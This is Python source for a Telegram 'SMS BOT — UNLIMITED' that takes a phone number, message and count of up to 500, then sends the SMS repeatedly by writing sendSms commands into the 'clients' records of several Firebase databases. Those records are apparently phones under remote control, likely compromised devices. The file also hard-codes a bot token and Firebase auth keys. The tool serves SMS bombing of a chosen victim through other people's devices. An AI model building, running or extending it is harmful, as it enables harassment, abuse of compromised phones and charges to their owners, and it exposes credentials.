import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import logging
import time
import threading
import re
import queue
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ─── CONFIG ────────────────────────────────────────────────────────────────
class Config:
    # ⚠️ APNA NAYA TOKEN YAHAN DAALEIN (purana revoke kar dein)
    BOT_TOKEN = "8684129121:AAFCVSNVR_GvoRBlsVJYBtm3U8btPnlsbHI"
    
    FIREBASE_URLS = [
        {"url": "https://adsf-8b4e8-default-rtdb.asia-southeast1.firebasedatabase.app", "key": "Annebella"},
        {"url": "https://dath-da88a-default-rtdb.firebaseio.com", "key": "Aneneblla"},
        {"url": "https://amoyu-af062-default-rtdb.firebaseio.com", "key": "Annebella"},
        {"url": "https://bishnu-a0e01-default-rtdb.firebaseio.com", "key": "Annebella"},
        {"url": "https://rockees-default-rtdb.firebaseio.com", "key": "Annebrlla"},
        {"url": "https://arvind-c5b03-default-rtdb.firebaseio.com", "key": ""}
    ]
    
    MAX_SMS_PER_BLAST = 500   # Aap badha sakte hain
    MESSAGE_DELAY = 1.5       # seconds between SMS
    MAX_RETRIES = 3
    RETRY_DELAY = 3
    HISTORY_FILE = "sms_history.json"

# ─── LOGGING ──────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(Config.BOT_TOKEN, parse_mode='HTML')

# ─── USER STATE ────────────────────────────────────────────────────────────
user_states = {}
state_lock = threading.Lock()

# ─── DATA STORAGE ─────────────────────────────────────────────────────────
def load_history():
    try:
        with open(Config.HISTORY_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_history(data):
    with open(Config.HISTORY_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def add_history(user_id, entry):
    data = load_history()
    uid = str(user_id)
    if uid not in data:
        data[uid] = []
    data[uid].append(entry)
    # Keep last 100 entries
    data[uid] = data[uid][-100:]
    save_history(data)

def get_history(user_id, limit=20):
    data = load_history()
    uid = str(user_id)
    return data.get(uid, [])[-limit:][::-1]

# ─── FIREBASE HELPERS ─────────────────────────────────────────────────────
def fb_get(path, firebase_url, firebase_key):
    url = f"{firebase_url}/{path}.json"
    if firebase_key:
        url += f"?auth={firebase_key}"
    try:
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        logger.error(f"GET error: {e}")
    return None

def fb_put(path, data, firebase_url, firebase_key):
    url = f"{firebase_url}/{path}.json"
    if firebase_key:
        url += f"?auth={firebase_key}"
    try:
        r = requests.put(url, json=data, timeout=10)
        return r.status_code == 200
    except Exception as e:
        logger.error(f"PUT error: {e}")
        return False

def get_online_devices(fb):
    data = fb_get('clients', fb["url"], fb["key"])
    if not data:
        return []
    online = []
    for device_id, info in data.items():
        if isinstance(info, dict):
            status = info.get('status')
            if status in [True, 1, 'true', 'online', 'True']:
                online.append({
                    'id': device_id,
                    'name': info.get('modelName') or info.get('model') or device_id,
                    'firebase': fb
                })
    return online

def get_all_devices():
    all_devices = []
    with ThreadPoolExecutor(max_workers=5) as ex:
        futures = [ex.submit(get_online_devices, fb) for fb in Config.FIREBASE_URLS]
        for f in futures:
            try:
                all_devices.extend(f.result(timeout=10))
            except Exception as e:
                logger.error(f"Device fetch error: {e}")
    return all_devices

def send_sms(device, phone, message):
    payload = {
        'from': 0,
        'to': phone,
        'message': message,
        'isSended': False,
        'timestamp': int(time.time())
    }
    return fb_put(f"clients/{device['id']}/webhookEvent/sendSms",
                  payload, device['firebase']['url'], device['firebase']['key'])

# ─── SMS SENDER ───────────────────────────────────────────────────────────
def send_with_retry(device, phone, message):
    for attempt in range(Config.MAX_RETRIES):
        try:
            if send_sms(device, phone, message):
                return True
            time.sleep(Config.RETRY_DELAY)
        except Exception as e:
            logger.error(f"Attempt {attempt+1} failed: {e}")
            time.sleep(Config.RETRY_DELAY)
    return False

def process_sms_job(chat_id, phone, message, count):
    """Background thread — sends SMS and updates user"""
    try:
        bot.send_message(chat_id,
            f"⏳ <b>SMS Blast Started</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📞 {phone}\n"
            f"🔢 Count: {count}\n"
            f"⏳ Please wait..."
        )
        
        devices = get_all_devices()
        if len(devices) < 1:
            bot.send_message(chat_id, "❌ No online devices available right now!")
            return
        
        sent = 0
        failed = 0
        last_update = time.time()
        
        for i in range(count):
            device = devices[i % len(devices)]
            if send_with_retry(device, phone, message):
                sent += 1
            else:
                failed += 1
            
            # Progress update every 5 SMS
            if (i + 1) % 5 == 0:
                bot.send_message(chat_id,
                    f"📊 <b>Progress: {i+1}/{count}</b>\n"
                    f"✅ Sent: {sent}\n"
                    f"❌ Failed: {failed}"
                )
                last_update = time.time()
            
            time.sleep(Config.MESSAGE_DELAY)
        
        # Final report
        bot.send_message(chat_id,
            f"✅ <b>SMS Blast Complete!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📞 {phone}\n"
            f"💬 {message[:40]}{'...' if len(message) > 40 else ''}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Success: {sent}/{count}\n"
            f"❌ Failed: {failed}\n"
            f"🕐 {datetime.now().strftime('%H:%M:%S')}"
        )
        
        # Save history
        add_history(chat_id, {
            'timestamp': datetime.now().isoformat(),
            'phone': phone,
            'message': message[:100],
            'count': count,
            'sent': sent,
            'failed': failed
        })
    
    except Exception as e:
        logger.error(f"Job error: {e}")
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

# ─── KEYBOARD ─────────────────────────────────────────────────────────────
def main_keyboard():
    kb = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(KeyboardButton("📱 SEND SMS"), KeyboardButton("📜 MY SMS HISTORY"))
    return kb

# ─── HANDLERS ─────────────────────────────────────────────────────────────
@bot.message_handler(commands=['start', 'help'])
def start_cmd(msg):
    text = (
        f"🔥 <b>SMS BOT — UNLIMITED</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ No credits required\n"
        f"✅ Unlimited SMS\n"
        f"✅ Free to use\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📱 Send SMS button dabayein aur shuru karein!"
    )
    bot.send_message(msg.chat.id, text, reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: m.text == "📱 SEND SMS")
def send_sms_btn(msg):
    with state_lock:
        user_states[msg.from_user.id] = {'step': 'phone'}
    bot.send_message(msg.chat.id,
        "📱 <b>STEP 1/3 — NUMBER</b>\n\n"
        "SMS bhejne wala number enter karein:\n"
        "<i>Example: +919876543210</i>",
        reply_markup=main_keyboard()
    )

@bot.message_handler(func=lambda m: m.text == "📜 MY SMS HISTORY")
def history_btn(msg):
    history = get_history(msg.from_user.id, 20)
    if not history:
        bot.send_message(msg.chat.id, "📜 Abhi tak koi SMS nahi bheja.", reply_markup=main_keyboard())
        return
    
    text = "📜 <b>Your SMS History (Last 20)</b>\n━━━━━━━━━━━━━━━━━━\n"
    for i, h in enumerate(history[:10], 1):
        text += (
            f"{i}. 📞 {h['phone']}\n"
            f"   💬 {h['message'][:30]}...\n"
            f"   ✅ {h['sent']}/{h['count']} sent\n"
            f"   🕐 {h['timestamp'][:16]}\n\n"
        )
    if len(history) > 10:
        text += f"... and {len(history) - 10} more"
    bot.send_message(msg.chat.id, text, reply_markup=main_keyboard())

@bot.message_handler(func=lambda m: True)
def handle_all(msg):
    uid = msg.from_user.id
    text = msg.text
    if not text or text.startswith('/'):
        return
    
    with state_lock:
        state = user_states.get(uid, {'step': 'idle'})
    
    # Phone step
    if state.get('step') == 'phone':
        phone = text.strip()
        if re.match(r'^\+?\d{10,15}$', phone):
            with state_lock:
                state['phone'] = phone
                state['step'] = 'message'
                user_states[uid] = state
            bot.send_message(uid, "📝 <b>STEP 2/3 — MESSAGE</b>\n\nSMS ka message likhein:", reply_markup=main_keyboard())
        else:
            bot.send_message(uid, "❌ Invalid number! Example: +919876543210", reply_markup=main_keyboard())
        return
    
    # Message step
    if state.get('step') == 'message':
        message = text.strip()
        if message and len(message) < 1000:
            with state_lock:
                state['message'] = message
                state['step'] = 'count'
                user_states[uid] = state
            bot.send_message(uid, f"🔢 <b>STEP 3/3 — COUNT</b>\n\nKitni baar bhejna hai? (1-{Config.MAX_SMS_PER_BLAST}):", reply_markup=main_keyboard())
        else:
            bot.send_message(uid, "❌ Message khali hai ya bahut lamba hai!", reply_markup=main_keyboard())
        return
    
    # Count step
    if state.get('step') == 'count':
        try:
            count = int(text.strip())
            if 1 <= count <= Config.MAX_SMS_PER_BLAST:
                # Start sending in background
                threading.Thread(
                    target=process_sms_job,
                    args=(uid, state['phone'], state['message'], count),
                    daemon=True
                ).start()
                
                bot.send_message(uid,
                    f"🚀 <b>Job Started!</b>\n"
                    f"📞 {state['phone']}\n"
                    f"🔢 {count} SMS\n\n"
                    f"Aapko progress updates milenge.",
                    reply_markup=main_keyboard()
                )
                
                with state_lock:
                    user_states[uid] = {'step': 'idle'}
            else:
                bot.send_message(uid, f"❌ 1 se {Config.MAX_SMS_PER_BLAST} ke beech number daalein!", reply_markup=main_keyboard())
        except ValueError:
            bot.send_message(uid, "❌ Sirf number daalein!", reply_markup=main_keyboard())
        return
    
    # Idle — unknown message
    if state.get('step') == 'idle':
        bot.send_message(uid, "👋 Neeche ke buttons use karein!", reply_markup=main_keyboard())

# ─── MAIN ─────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    logger.info("🚀 Bot starting...")
    logger.info(f"📡 Firebase URLs: {len(Config.FIREBASE_URLS)}")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)